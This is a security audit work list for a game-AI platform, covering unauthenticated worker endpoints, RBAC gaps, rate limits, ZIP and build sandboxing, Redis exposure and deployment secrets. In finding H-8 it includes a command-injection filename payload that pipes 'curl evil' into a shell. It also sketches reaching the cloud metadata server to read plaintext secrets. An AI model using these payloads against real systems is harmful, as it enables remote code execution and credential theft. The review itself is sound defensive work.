# Security Review — `game-ai-platform`

Full security review of backend auth/RBAC, worker callbacks, rate limiting, upload/ZIP/build
orchestration, container execution, config/deployment safety, and frontend guards. Every finding
below was confirmed against the current code on branch `fix/security` with concrete file/line
references.

**No code has been changed.** This document is the work list — items are ordered by severity so they
can be worked through one by one.

Status legend: `[ ]` open · `[x]` fixed · `[~]` partially addressed / accepted risk.

---

## Executive summary

The platform does **not** currently satisfy the intended Anonymous / Guest / User / Admin / Worker
policy. The dominant problems:

1. **Worker callback/mutation endpoints are completely unauthenticated** — anyone on the internet can
   forge build/match/job/container state. (C-1)
2. **A worker API key is promoted to a full ADMIN identity on every JWT route** — key leakage = full
   admin compromise. (C-2)
3. **"Guest" is not read-only** — a freshly verified guest can upload code, build images, create
   agents/matches, and delete resources, because mutations only require `get_current_user`. (H-1)
4. **App-data reads (matches, leaderboard, SSE, jobs) are anonymous**, violating the
   "only landing + auth-lifecycle is anonymous" policy. (H-2)
5. **Rate limiting is hard-coded, inconsistent, and not centrally configurable**; required toggles
   (`RATE_LIMIT_BYPASS`, `DISABLE_IP_RATE_LIMITING`, `TRUST_PROXY_HEADERS`, per-category limits) do not
   exist. (H-3)
6. **Upload / ZIP / Docker-build pipeline has no size, file-count, compression-ratio, or
   build-network controls**, and build-time `pip` runs untrusted code with network access on a
   root-level Docker-socket worker. (H-4, H-7)
7. **Users can directly write their own agent Elo / win / loss stats** via the public update schema. (H-5)
8. **Password-reset token + new password are passed as URL query parameters** (logged by proxies). (H-6)

Plus several Medium/Low items (unbounded pagination, unbounded log growth, path-trust on
download/delete, production config gaps, frontend role guards).

---

# Findings

## CRITICAL

### [ ] C-1 — Worker callback / mutation endpoints are fully unauthenticated

**Files**
- `backend/app/api/routes/jobs.py:43` `PATCH /jobs/build/{job_id}`
- `backend/app/api/routes/jobs.py:65` `POST  /jobs`
- `backend/app/api/routes/jobs.py:92` `PATCH /jobs/match/{job_id}`
- `backend/app/api/routes/matches.py:117` `PATCH /matches/{match_id}` (comment even admits "no authentication")
- `backend/app/api/routes/agent_containers.py:39` `POST  /agent_containers/upsert`
- `backend/app/api/routes/agent_containers.py:51` `PATCH /agent_containers/{container_id}`

**Evidence.** None of these endpoints declare any auth dependency. They take only a payload + a
service. `matches.py:122-127` literally documents that it is unauthenticated.

**Exploit.** An anonymous internet client can: mark arbitrary builds completed/failed, inject fake
image IDs/tags, forge match results and `game_state`, drive leaderboard/Elo changes by posting a
crafted `result` (the match service calls `_update_agent_stats` on transition to `COMPLETED`,
`match.py:102-103`), and pollute container telemetry. `POST /jobs` lets anyone create build-job rows.

**Impact.** Total integrity loss for submissions, matches, jobs, leaderboards, and telemetry;
competition fairness destroyed; DB pollution.

**Fix.** Add `Depends(require_worker_api_key)` (already exists at `deps/auth.py:31`) to every worker
callback. Do **not** allow JWT users/admins to call them. Validate state transitions server-side and
bound `logs`/`result`/`game_state` sizes (see M-3). Consider a dedicated `/worker/...` router namespace.

**Regression tests.** Anonymous → 403; JWT guest/user/admin without key → 403; valid `x-api-key` → 200;
invalid status transition rejected.

---

### [ ] C-2 — Worker API key is accepted as an ADMIN user on every JWT route

**Files**
- `backend/app/api/deps/auth.py:44` (`is_worker = Depends(verify_worker_api_key)`)
- `backend/app/api/deps/auth.py:59-67` (synthesizes a `User(role=UserRole.ADMIN, email_verified=True)`)
- `backend/app/api/deps/permissions.py:16-37` (`get_current_admin` then passes)

**Evidence.** `get_current_user` returns a fabricated admin user whenever a valid `x-api-key` is
present, *before* checking the JWT. That synthetic admin satisfies `CurrentAdmin` and every per-route
`role == ADMIN` check.

**Exploit.** Anyone holding the worker key (leaked from compose env, CI logs, the worker image, the
host, or a compromised worker container) can call **all** admin endpoints with just the header:
`GET/PATCH/DELETE /users`, `PATCH /users/{id}/role`, `GET/PUT /matches/scheduler/config`,
`GET /submissions/{id}/download` for any user, agent/container admin reads, etc. No JWT required.

**Impact.** Full administrative compromise via a credential intended only for internal worker callbacks.

**Fix.** Remove the worker fallback from `get_current_user`. Keep JWT auth and worker-key auth as
**separate** dependencies. Worker callbacks use only `require_worker_api_key`; admin routes use only
`CurrentAdmin`.
**Important migration note:** the worker legitimately calls three *read* endpoints today and currently
only succeeds because of this admin fallback — `GET /submissions/{id}` (`backend_api.py:169`),
`GET /submissions/{id}/download` (`backend_api.py:181`), `GET /agents/{id}` (`backend_api.py:205`).
Removing the fallback naively will break the build/match workers. Introduce a combined
"owner-or-worker" dependency for exactly those three reads so the worker keeps access without being
"admin" everywhere.

**Regression tests.** `x-api-key` alone cannot reach `/users`, `/users/{id}/role`,
`/matches/scheduler/config`; worker key *can* still read/download submissions and read agents; admin JWT
cannot call worker callbacks.

---

## HIGH

### [ ] H-1 — "Guest" is not read-only: verified guests can mutate resources

**Files**
- `backend/app/api/routes/agents.py:15` `POST /agents`, `:85` `PATCH`, `:107` `DELETE`
- `backend/app/api/routes/submissions.py:19` `POST /submissions`, `:102` `DELETE`
- `backend/app/api/routes/matches.py:82` `POST /matches`
- `backend/app/api/routes/users.py:66` `PATCH /users/me`, `:100` `POST /users/change-password`

**Evidence.** All mutating routes depend only on `get_current_user` / `CurrentUser`. There is no check
for minimum role `UserRole.USER` and no `verify_email_verified` (login already blocks unverified, so the
real gap is **verified guests**). New users are created with `role=GUEST` (`auth.py:146`,
`models/user.py:25`), and nothing stops a guest from mutating.

**Exploit.** Register → verify → immediately upload ZIPs, trigger Docker builds, create agents, create
matches, and delete resources, all without being promoted to `user`.

**Impact.** Competition-policy bypass, untrusted-code execution by unapproved accounts, resource
exhaustion, guest→user privilege escalation in practice.

**Fix.** Add named dependencies (e.g. `VerifiedUserOrHigher`, building on `verify_user_role(UserRole.USER)`
at `permissions.py:67` + `verify_email_verified`) and apply to all agent/submission/match mutations.
Decide policy for profile/password edits: either treat them as auth-lifecycle exceptions (Guest+) or
restrict to User+; document the choice.

**Regression tests.** Verified guest → 403 on every create/update/delete; verified user can mutate own
resources; admin unaffected.

---

### [ ] H-2 — Anonymous access exists well beyond landing + auth-lifecycle

**Files**
- `backend/app/api/routes/agents.py:35` `GET /agents/leaderboard/{game_type}` (anonymous)
- `backend/app/api/routes/matches.py:102` `GET /matches/{match_id}` (anonymous)
- `backend/app/api/routes/matches.py:141` `GET /matches` (anonymous)
- `backend/app/api/routes/matches.py:156` `GET /matches/{match_id}/stream` (anonymous SSE — comment: "spectating is public")
- `backend/app/api/routes/jobs.py:28` `GET /jobs/build/{job_id}` (anonymous)
- `backend/app/api/routes/jobs.py:77` `GET /jobs/match/{job_id}` (anonymous)

**Evidence.** None of these declare an auth dependency.

**Exploit.** Anonymous clients enumerate matches and read full match data/logs/results, stream live
`game_state`, and query job status/logs. The SSE endpoint holds an open Redis pub/sub connection per
anonymous client (`matches.py:193-220`) → unauthenticated resource consumption.

**Impact.** Policy violation, information disclosure, SSE-based DoS/scraping.

**Fix.** Require at least a verified Guest for all app-data endpoints. If public leaderboard/spectating
is intentionally desired, list those explicitly as public exceptions and rate-limit aggressively + add
SSE connection caps and auth.

---

### [ ] H-3 — Rate limiting is hard-coded, inconsistent, and not configurable

**Files**
- `backend/app/main.py:39-49` (global limiter; `default_limits=["500/hour","30/minute"]`, IP-keyed)
- `backend/app/api/routes/auth.py:35,80,124,146`
- `backend/app/api/routes/email.py:42,79,121`
- `backend/app/api/routes/users.py:45,56,67,101,134,183,212,248,277`
- `backend/app/core/config.py:38` (only `RATE_LIMITING_ENABLED` exists)

**Evidence / correction to prior notes.** A global default of `500/hour;30/minute` *is* applied to all
routes via `SlowAPIMiddleware` (`main.py:153`), so non-decorated routers are not fully unlimited — but:
- The limiter is **IP-keyed only** (`get_remote_address`). Behind a reverse proxy every user shares the
  proxy IP, so limits are simultaneously too strict (shared) and bypassable (no proxy-header handling).
- A global `30/minute` would throttle **worker callbacks** (need ~1200/min) and SSE.
- Per-route limits diverge from the required defaults:
  - Login `30/minute;200/day` (`auth.py:80`) vs required `10/minute + 60/hour`.
  - Register `20/hour` (`auth.py:35`) vs required `6/minute + 40/hour`.
  - Password-reset request `10/hour` (`auth.py:124`); reset `5/minute` (`auth.py:146`); verify-email
    `10/minute` (`email.py:121`); resend `10/day` (`email.py:42`) — all inconsistent with the required
    `6/minute + 20/hour`.
  - Admin routes hard-coded `1000/hour` (`users.py`, `email.py:79`).
- No settings for `RATE_LIMIT_BYPASS`, `DISABLE_IP_RATE_LIMITING`, `TRUST_PROXY_HEADERS`, or
  per-category limits; nothing rejects `RATE_LIMIT_BYPASS` in production.

**Impact.** Auth brute-force amplification, no per-category tuning, broken limits behind a proxy,
worker/SSE throttling, inability to run hackathon mode (shared IPs).

**Fix.** Centralize: add settings for every required category; key authenticated routes by user-id,
anonymous by IP; honor `DISABLE_IP_RATE_LIMITING` (keep user-id limits), `TRUST_PROXY_HEADERS=false`
default; reject `RATE_LIMIT_BYPASS=true` in production. Apply explicit limits to upload, match-create,
SSE, and worker callbacks. See the rate-limit matrix below for targets.

---

### [ ] H-4 — Upload / ZIP / build pipeline lacks resource-exhaustion controls

**Files**
- `backend/app/api/services/submission.py:50-66` (upload)
- `orchestration/lib/agent_builder.py:25-34` (`_safe_extract_zip`)
- `orchestration/lib/agent_builder.py:226-236` (Docker build)

**Evidence.**
- Backend accepts uploads on filename suffix only (`submission.py:50`), no content-type check, and
  streams to disk with `shutil.copyfileobj` (`:65`) — **no max size, no per-user quota**. There is no
  body-size limit at the app layer.
- `_safe_extract_zip` has a path-prefix check but **no limits on uncompressed size, entry count, nesting
  depth, or compression ratio** → ZIP-bomb / disk-fill. (The prefix check
  `str(p).startswith(str(dst))` is also subtly weak — sibling-prefix paths like `/tmp/aaa` vs
  `/tmp/aaa-evil` — though `dst` being a fresh tempdir makes traversal low-risk in practice; prefer
  `Path.resolve().is_relative_to(dst)`.)
- Docker build uses `network_mode="default"` (`agent_builder.py:235`) — see H-7.

**Impact.** Backend/worker DoS, disk exhaustion, expensive builds.

**Fix.** Enforce max upload bytes (app + proxy) and per-user quota; validate the archive before
build (max archive size, max uncompressed size, max file count, max depth, reject symlinks/special
files, robust containment with `relative_to`); add build timeouts/builder resource limits.

---

### [ ] H-5 — Users can directly write their own agent stats (Elo/wins/losses)

**Files**
- `backend/app/schemas/agent.py:19-26` (`AgentUpdate` exposes `wins, losses, draws, matches_played, elo`)
- `backend/app/api/services/agent.py:104-113` (applies those fields on update)
- `backend/app/api/routes/agents.py:85` (`PATCH /agents/{id}` — owner or admin)

**Evidence.** `AgentUpdate` is the public body for `PATCH /agents/{id}`; the service writes every stat
field if present. Any owner can therefore set their own agent's `elo`, `wins`, etc.

**Exploit.** `PATCH /agents/{my_agent} {"elo": 99999, "wins": 1000}` → top of leaderboard.

**Impact.** Direct competition-integrity compromise.

**Fix.** Remove stat fields from the user-facing `AgentUpdate` (keep only `name`,
`active_submission_id`). Update stats only via the internal match-completion path
(`match.py:_update_agent_stats`).

**Regression test.** User PATCH cannot change elo/wins/losses/draws/matches_played; match completion
still updates them.

---

### [ ] H-6 — Password-reset token and new password are sent as URL query parameters

**Files**
- `backend/app/api/routes/auth.py:125-130` `request_password_reset(email: str, ...)`
- `backend/app/api/routes/auth.py:147-151` `reset_password(token: str, new_password: str, ...)`

**Evidence.** These are bare `str` parameters on `POST` operations with no `Body(...)`, so FastAPI binds
them as **query parameters**. Calls look like
`POST /auth/reset-password?token=...&new_password=...` and `POST /auth/request-password-reset?email=...`.

**Exploit / impact.** The plaintext new password and reset token (and the user's email) land in proxy
access logs, the browser history/referrer, and any intermediary — credential disclosure.

**Fix.** Move `token`, `new_password`, and `email` into a Pydantic request body model (like
`EmailVerificationRequest`/`PasswordChangeRequest` already do elsewhere).

---

### [ ] H-7 — Build-stage agent execution happens in an UNSANDBOXED container on a root Docker-socket worker

**Files**
- `orchestration/lib/agent_builder.py:238-243` (post-build syntax-check `containers.run` with **no** secure kwargs)
- `orchestration/lib/agent_builder.py:235` (`network_mode="default"` during build)
- `orchestration/Dockerfile.worker:25` + `docker-compose.yml:123-127, 149-153` (`/var/run/docker.sock`, `user: root`)

**Evidence.** After building the agent image, the builder runs a "syntax check" container:
`client.containers.run(image.id, command=["python","-c", "...compile(AGENT_FILE)..."], remove=True)`.
This call passes **none** of `secure_default_settings.yaml` (no `--network none`, no `cap_drop`, no
`mem_limit`/`pids_limit`/`read_only`). User code can execute in it two ways:
- A `sitecustomize.py` at the ZIP root is auto-imported by Python at interpreter startup (cwd is on
  `sys.path` for `python -c`), so it runs *before* `compile()`.
- Filename command injection — see **H-8**.

The container runs as non-root `runner` but with **default Linux capabilities, default bridge network
(egress), and no resource limits**, on a builder worker that mounts the host Docker socket and runs as
`root`.

**Correction to earlier draft.** The standard build does **not** run user `pip install`:
`Dockerfile.agent` only does `COPY . .` (base deps are fixed: numpy + gamelib). So image *build* does
not execute user code; the real build-stage code-exec is this unsandboxed syntax-check container.

**Impact.** Code execution from a mere upload, with egress and a wider kernel-attack surface than the
hardened runtime containers. **The agent-builder runs on the backend VM in both topologies**
(`deploy/terraform/backend-startup.sh:271` starts `agent-builder`; only the match-runner is offloaded to
the GCP MIG), so build-stage code-exec is colocated with Postgres, Redis, the Docker socket, the worker
API key, and — on GCP — the metadata server. Because the syntax-check container has the **default bridge
network**, it can reach `169.254.169.254` and read the **plaintext** `postgres_password`,
`jwt_secret_key`, `worker_api_key`, `smtp_password` from instance metadata
(`deploy/terraform/backend-vm.tf:63-69`) → full secret compromise on GCP. Runtime agent containers have
`network none` and cannot reach metadata; only this build-stage container can.

**Fix.** Run the syntax-check with the same secure kwargs as runtime (network none, cap drop, mem/pids
limits, read-only); fix H-8; disable build network or use a controlled mirror; add build timeouts;
isolate Docker-socket workers from internet-facing services (rootless/remote builder).

---

### [ ] H-8 — Command injection via crafted agent filename into the build-time syntax check

**Files**
- `orchestration/lib/agent_builder.py:239-243` (f-string interpolates `entry_file` into `python -c`)
- `orchestration/lib/agent_builder.py:47-73` (`_find_agent_entry` accepts any `*_agent.py` name)

**Evidence.** The check command is built as
`f"with open('{entry_file}', 'rb') as f: compile(f.read(), '{entry_file}', 'exec')"`, where
`entry_file` is a filename taken straight from the uploaded ZIP (only required to end with `_agent.py`).
ZIP entry names may contain quotes/semicolons, so a file named e.g.
`x'); __import__('os').system('curl evil|sh') #_agent.py` breaks out of the string literal and executes
attacker code. `entry_file` is also passed as a Docker `buildarg` / `ENV AGENT_FILE` (lower priority).

**Exploit.** Upload a ZIP whose entry filename contains the payload → arbitrary code runs in the
unsandboxed syntax-check container (H-7) on the builder worker. No other vulnerability required;
reachable by anyone who can upload (today even guests, see H-1).

**Impact.** Unauthenticated-ish (verified-account) RCE on the builder worker tier with egress.

**Fix.** Do not interpolate the filename into a `python -c` program. Pass the path via `argv`
(`python -c '...' "$AGENT_FILE"` reading `sys.argv[1]`) or via an env var read with `os.environ`, and
strictly validate the filename charset (`[A-Za-z0-9._-]+`). Run the check with secure kwargs (H-7).

**Regression test.** A ZIP entry named `evil'); open('/proc/1/...')#_agent.py` (or a marker-writing
payload) must be rejected/neutralized, not executed.

---

## MEDIUM

### [ ] M-1 — Match creation does not verify the caller owns the agents

**Files**
- `backend/app/api/routes/matches.py:82-96` (`_current_user` is unused)
- `backend/app/api/services/match.py:146-165` (`_validate_agents_for_match` checks existence/game/build
  but not ownership)

**Evidence.** `create_match` ignores the authenticated user; the service validates only that the agent
IDs exist, match the game, and have a successful build. Any verified user can start matches between
**other users'** agents.

**Impact.** Users can consume build/run resources on arbitrary agents and influence others' Elo/stats
by forcing matches. Severity depends on whether open matchmaking is intended; flag and decide.

**Fix.** Decide policy: if matches must involve the caller's agent(s), enforce ownership; otherwise
document open matchmaking explicitly and rate-limit (see H-3).

---

### [ ] M-2 — Submission download/delete trust a DB-stored absolute filesystem path

**Files**
- `backend/app/api/routes/submissions.py:76-84` (`Path(submission.object_path)` → `FileResponse`)
- `backend/app/api/services/submission.py:72` (stores `str(file_path.absolute())`)
- `backend/app/api/services/submission.py:128-130` (`Path(object_path).unlink()`)

**Evidence.** The stored value is an absolute path used directly for serving and deletion with no
containment check against `SUBMISSIONS_DIR`.

**Impact.** If `object_path` is ever corrupted (other bug, bad migration, admin/worker write), download
could disclose, and delete could remove, arbitrary files readable/writable by the backend process.

**Fix.** Store only a key/relative filename; resolve under `SUBMISSIONS_DIR` and verify containment with
`Path.resolve().relative_to(base)`; reject symlinks.

---

### [ ] M-3 — Worker log / result / game-state payloads are unbounded

**Files**
- `backend/app/api/services/submission.py:101-102` (`job.logs += logs + "\n"`)
- `backend/app/api/services/match.py:89-96` (`match.logs += logs + "\n"`; `result`/`game_state` arbitrary dicts)
- Reachable today **anonymously** via C-1.

**Evidence.** Logs are appended without a cap; `result` and `game_state` accept arbitrary JSON. The
5 MiB cap in `agent_runner.py:15` is client-side only and does not constrain the API.

**Impact.** DB bloat, memory pressure, slow API/SSE responses, DoS. Amplified by C-1 (unauthenticated).

**Fix.** Cap per-append and total stored log size (truncate server-side); add a max JSON body size at
app/proxy; validate `result`/`game_state` schemas per game type.

---

### [ ] M-4 — Unbounded pagination / leaderboard limits enable cheap DoS and scraping

**Files**
- `backend/app/api/routes/agents.py:39` (`limit: int = 100`, no bound), `:69-70`
- `backend/app/api/routes/matches.py:144-145`
- `backend/app/api/routes/agent_containers.py:20-21`
- `backend/app/api/routes/submissions.py:92-93`

**Evidence.** Only `/users` constrains `limit` (`users.py:140`, `le=100`). All other list/leaderboard
endpoints accept arbitrarily large `limit` (e.g. `?limit=1000000`).

**Impact.** Large DB scans and response payloads → memory/CPU/bandwidth exhaustion; aids mass scraping
(esp. combined with anonymous reads in H-2).

**Fix.** Add `Query(ge=1, le=100)` (or similar) to every `limit`, and `ge=0` to `skip`.

---

### [ ] M-5 — Production config validation is incomplete

**Files**
- `backend/app/core/config.py:48` (`WORKER_API_KEY` default `"dev-worker-key-12345"`)
- `backend/app/core/config.py:104-107` (`BYPASS_EMAIL_VERIFICATION`)
- `backend/app/core/config.py:237-257` (only SMTP is validated in prod)
- `.env.example`, `backend/.env.example`, `docker-compose*.yml`

**Evidence.** Config validates JWT length, prod HTTPS CORS, SMTP, token expiries, and turn timeouts, but
does **not**: reject the default/weak `WORKER_API_KEY` in production, enforce a minimum worker-key
length, reject `RATE_LIMIT_BYPASS` in prod, default `TRUST_PROXY_HEADERS=false`, or require
`TRUSTED_HOSTS` in production. `BYPASS_EMAIL_VERIFICATION` is correctly neutralized in code
(`auth.py:130` `and not settings.is_production`) but not rejected at config load. `backend/.env.example`
ships `BYPASS_EMAIL_VERIFICATION=True` and a weak example `JWT_SECRET_KEY`.

**Impact.** Easy to deploy with a default worker key (→ C-2 becomes trivial), no proxy-header/host
hardening, accidental bypass flags.

**Fix.** Add a production `model_validator` that rejects: default/short `WORKER_API_KEY`,
`RATE_LIMIT_BYPASS=true`, missing `TRUSTED_HOSTS`. Add `TRUST_PROXY_HEADERS` (default false). Document all
new settings in both `.env.example` files.

---

### [ ] M-6 — CORS error-mirroring can echo `Access-Control-Allow-Origin: *` with credentials

**Files**
- `backend/app/main.py:52-66` (`_apply_cors_headers`)
- `backend/app/main.py:188-196` (`CORSMiddleware`, `allow_credentials=True`)

**Evidence.** If `ALLOW_ORIGINS` contains `*`, `_apply_cors_headers` sets `ACAO: *` on error responses,
and the main CORS middleware is configured with `allow_credentials=True`. `*` + credentials is invalid
and, more importantly, signals a misconfiguration path. Production validation forces `https://` origins
(`config.py:196-205`) but does not forbid a literal `*`.

**Impact.** Misconfiguration risk / inconsistent CORS behavior if `*` is ever set.

**Fix.** Reject `*` in `ALLOW_ORIGINS` when `allow_credentials=True` (and in production); never emit
`ACAO: *` alongside credentials.

---

## LOW / INFORMATIONAL

### [ ] M-7 — Redis has no authentication/TLS; exposure depends on deployment

**Files**
- `docker-compose.yml:2-9` (prod: `expose` only — internal bridge, **safe**)
- `docker-compose.dev.yml:2-4` (`6379:6379` published — dev only)
- `deploy/terraform/backend-startup.sh:264-266` (publishes `6379:6379` on `0.0.0.0`)
- `deploy/terraform/backend-vm.tf:118-129` (internal firewall rule scoped to worker tag)
- `deploy/terraform/variables.tf:40-50` (`network`/`subnetwork` default to `"default"`)
- `deploy/terraform/worker-template.tf:42` (`redis://<internal_ip>:6379`, no auth)
- `backend/app/core/queue.py:57,75` (`RPUSH queue:builds` / `queue:matches`)

**Evidence.** No `requirepass`, no TLS, no `bind` restriction on Redis in any compose/terraform file.
Only the network layer gates access.
- **Single VPS, compose-only:** Redis is `expose`-only → internal bridge, not reachable externally. Adequate.
- **Terraform single VPS:** the generated override publishes `0.0.0.0:6379`. Docker's DNAT **bypasses host
  UFW**, so on a generic VPS Redis is internet-exposed unless a cloud firewall blocks it. (GCP's VPC
  firewall happens to block it; non-GCP hosts would not.)
- **GCP multi-instance:** workers connect cross-VM unauthenticated. Because `network` defaults to the GCP
  **`default`** network, the auto-created **`default-allow-internal`** rule lets *every* VM in the project
  reach 6379 on all ports — broader than the intended worker-tag rule (GCP firewall is a permissive union,
  so the narrow rule does not restrict it).

**Exploit / impact.** Anyone who can reach Redis has full unauthenticated control of the job queues and
pub/sub. A compromised build worker (see H-7) can `RPUSH` crafted jobs into `queue:builds`/`queue:matches`,
causing other workers to build/run attacker-controlled images → **lateral RCE across the worker fleet**.
Also enables rate-limit-store tampering and Redis-native file-write attacks (mitigated by containerization).

**Fix.**
- Set `requirepass` and use a passworded `REDIS_URL` (`redis://:<pw>@host:6379/0`) — slowapi, redis-py, and
  the worker `job_queue` all accept it. Highest-value step; protects the queue even from VPC-internal access.
- Do not publish on `0.0.0.0`; bind to the internal IP (`"<internal_ip>:6379:6379"`) when a separate worker
  VM must reach it; otherwise drop the published port and use the compose network alias.
- Use a custom VPC (no `default-allow-internal`) so only the worker-tag firewall rule applies.
- For GCP cross-VM Redis, add TLS or use Memorystore (AUTH + TLS).

**Severity.** Low for compose-only single VPS; **High** for the GCP-default-network / multi-worker topology.

---

### [ ] M-8 — Build/run resource exhaustion on worker hosts from untrusted submissions

**Files**
- `orchestration/lib/agent_builder.py:226-236` (`client.images.build` — no timeout; `nocache=True`)
- `orchestration/lib/agent_builder.py:37-44` (`_content_hash` reads every extracted file)
- `orchestration/lib/match_manager.py:441,516` (`history` appends a full game-state per turn, returned as `result`)
- `orchestration/lib/match_manager.py:200-296` + `agent_communication.py:200-243` (per-turn `logs` list unbounded in line count)
- `orchestration/secure_default_settings.yaml:7-9` (tmpfs has no `size=`)

**Evidence.** Beyond the ZIP limits in H-4: the image build has **no timeout** and uses `nocache=True`
per submission, so attacker submissions can stall the build queue and pile up images/layers → disk
exhaustion on the builder. At match time, the worker accumulates an unbounded `history` (one full state
per turn) and an unbounded count of <1 MiB stdout log lines per turn in memory before pushing them to
the backend (DB/SSE side is M-3). No visible cap on concurrent matches per worker (N × 512 MB).

**Impact.** Builder/match-worker memory and disk exhaustion → worker outage; on single-VPS this also
starves the colocated backend/DB.

**Fix.** Add a build timeout and periodic image pruning/quota; cap total stored `history`/log size and
match wall-clock; bound concurrent matches per worker; set tmpfs `size=`.

---

### [ ] M-9 — Deployment integrity: unpinned images, mutable branch boot, plaintext metadata secrets

**Files**
- `deploy/terraform/variables.tf:19` (`worker_image = ...agent-worker:latest`)
- `orchestration/Dockerfile.agent:1`, `Dockerfile.base:24` (`:latest` base, pulled fresh each build)
- `deploy/terraform/backend-startup.sh:55-64` (`git reset --hard origin/feat/deploy-workers` on every boot)
- `deploy/terraform/backend-vm.tf:63-69` (DB/JWT/worker/SMTP secrets passed as plaintext instance metadata)
- `deploy/terraform/worker-template.tf:36` (SA `scopes = ["cloud-platform"]`; mitigated by narrow IAM roles)

**Evidence.** Images use mutable `:latest` tags (no digest pinning) and are pulled at build/deploy time;
the backend VM hard-resets to a **feature branch** on every boot; secrets live in plaintext GCE metadata
readable by any process/container on the VM that can reach the metadata server (see H-7). The worker OAuth
scope is `cloud-platform`, though effective access is bounded by the least-privileged IAM roles
(`logging.logWriter`, `monitoring.metricWriter`, `artifactregistry.reader`) — so that part is Low.

**Impact.** A compromised branch, GHCR image, or registry account yields code execution on the hosts;
plaintext-metadata secrets are exfiltratable from any colocated container compromise (H-7/H-8).

**Fix.** Pin images by digest (or immutable release tags); deploy a pinned commit/tag, not a moving
branch; move secrets to Secret Manager (or at least block container egress to `169.254.169.254`); narrow
the SA scope to match the IAM roles.

---

### [ ] L-2 — Unauthenticated `PATCH /jobs/build` enables arbitrary-image execution on workers

Consequence of **C-1**: an attacker can set a build job's `image_tag` to any value; the match runner
resolves it (`orchestration/lib/match_manager.py:76-85`) and `docker run`s it as the "agent". Still
constrained by the secure run kwargs, but lets an unauthenticated party run an arbitrary image on a
worker. Closed by fixing C-1.

---

### [ ] M-10 — User-controlled `state_init_data` reaches the game engine in the privileged worker

**Files**
- `backend/app/models/match.py:40` (`state_init_data: dict[str, Any] = {}`, no validation)
- `backend/app/api/routes/matches.py:92-96` (merged with game defaults, queued as-is)
- `orchestration/lib/match_manager.py:249-250` (`State.initial(state_init_data)` runs in-process)

**Evidence.** `POST /matches` accepts arbitrary `config.state_init_data`; only `turn_time_limit` is
bounded (`match.py:49`). The match runner passes it straight to `State.initial(...)`, executed in the
**worker process** (not a sandboxed container) — the process that holds the Docker socket and worker API
key. The agent *code* is sandboxed; engine/state initialization is not.

**Impact.** Crafted init data (e.g., huge dimensions, or a gamelib parsing bug) → CPU/memory DoS or code
paths in the privileged worker. Reachable by any match creator (today even guests, H-1).

**Fix.** Validate/whitelist `state_init_data` per game type (allowed keys, types, numeric bounds) in the
backend before queueing; treat engine init input as untrusted.

---

### [ ] M-11 — No session invalidation on password change or reset

**Files**
- `backend/app/core/security.py:107-145` (JWT has no `jti`/version claim)
- `backend/app/models/user.py` (no token-version / `tokens_valid_after` column)
- `backend/app/api/services/auth.py:403-406` (`reset_password` rotates hash only)
- `backend/app/api/services/user.py` (`change_password` rotates hash only)

**Evidence.** Access tokens are stateless with only `sub`/`role`/`exp`; nothing ties a token to a
password generation. Changing or resetting the password does not revoke existing tokens.

**Impact.** After a password reset — exactly when recovering a compromised account — the attacker's
existing JWT remains valid for up to `JWT_ACCESS_TOKEN_EXPIRE_HOURS` (24h). Same for role downgrades.

**Fix.** Add a `token_version` (or `tokens_valid_after` timestamp) column + claim; reject tokens older
than the user's current value; bump on password change/reset (and ideally role change/logout-all).

---

### [ ] L-3 — `profile_picture_url` is unvalidated user input

**Files**
- `backend/app/schemas/user.py:15` (`UserCreate`), `:31` (`UserUpdate`) — arbitrary string, no validator
- returned in `UserResponse` (`:55`) and rendered by the frontend

**Evidence.** Unlike `username` (restricted to `[A-Za-z0-9_-]`), `profile_picture_url` accepts any string
and is stored/returned verbatim.

**Impact.** `javascript:`/`data:` URIs → potential stored XSS depending on how the frontend renders the
avatar; stored-content injection; an SSRF sink if any server-side code ever fetches it.

**Fix.** Validate scheme (`https?://` only) and length; consider hosting avatars instead of storing URLs.

---

### [ ] L-4 — Account enumeration and unverified-account pre-hijack

**Files**
- `backend/app/api/services/auth.py:185-193` (401 "Invalid email or password" vs 403 "Email not verified")
- `backend/app/api/services/auth.py:85-128` (re-registration deletes an existing **unverified** account)

**Evidence.** Login distinguishes unverified accounts (403) from invalid creds (401), and short-circuits
the password check when the user does not exist (timing). Re-registering a victim's still-unverified
username/email deletes their pending registration.

**Impact.** Email/username enumeration; pre-verification denial/hijack of a pending account. Low.

**Fix.** Return a uniform 401 for login failures (surface "verify your email" only after correct
credentials, or via a separate authenticated check); for re-registration, avoid destroying an existing
pending account on mere collision (e.g., require proof of ownership or rate-limit/notify).

---

### [ ] L-1 — Frontend route guards are authentication-only, not role-aware

**Files**
- `frontend/src/components/auth/ProtectedRoute.tsx:9-34` (checks `isAuthenticated` only)
- `frontend/src/App.tsx:49-66` (admin pages `users`, `containers`, `matches-admin` under the same guard)

**Evidence.** Any logged-in user can navigate to admin pages in the UI; backend `CurrentAdmin` still
blocks the API, so this is UX/defense-in-depth, not a backend bypass. (Backend remains source of truth.)

**Fix.** Add role-aware guards; hide guest/admin controls appropriately after backend RBAC is corrected.

### [ ] L-2 — Verbose worker comments advertise the missing auth

`matches.py:122-127` and the `jobs.py` "used by workers" comments document the unauthenticated design;
remove once C-1 is fixed to avoid signposting.

### [ ] L-3 — `POST /jobs` (`jobs.py:65`) allows anonymous build-job row creation

Even without enqueue, this pollutes the jobs table. Fold into C-1 (worker-key only) or remove if unused.

### [ ] L-4 — `request_password_reset` email enumeration is correctly mitigated

Informational/positive: always returns the same message (`auth.py:141`) and the service no-ops on
unknown email (`auth.py:341-343`). Keep.

---

# Route permission matrix

Legend: **Anon** = no auth · **Guest+** = verified guest or higher · **User+** = approved user or admin ·
**Admin** = JWT admin only · **WorkerKey** = `x-api-key` only (no JWT fallback).

| Method | Path | Current auth | Intended | Notes |
|---|---|---|---|---|
| POST | `/auth/register` | Anon | Anon | lifecycle |
| POST | `/auth/login` | Anon | Anon | lifecycle |
| POST | `/auth/request-password-reset` | Anon (query param) | Anon | **H-6** email in URL |
| POST | `/auth/reset-password` | Anon (query param) | Anon | **H-6** token+password in URL |
| POST | `/email/verify-email` | Anon | Anon | lifecycle (body, ok) |
| POST | `/email/resend-verification` | CurrentUser | Guest+ (unverified allowed) | lifecycle |
| GET | `/email/verification-status` | CurrentUser | Guest+ | ok |
| POST | `/email/{user_id}/resend-verification` | CurrentAdmin | Admin | **C-2** key=admin |
| GET | `/users/roles` | CurrentUser | Guest+/Admin | ok |
| GET | `/users/me` | CurrentUser | Guest+ | ok |
| PATCH | `/users/me` | CurrentUser | policy (Guest+ or User+) | **H-1** |
| POST | `/users/change-password` | CurrentUser | Guest+ (lifecycle) | **H-1** |
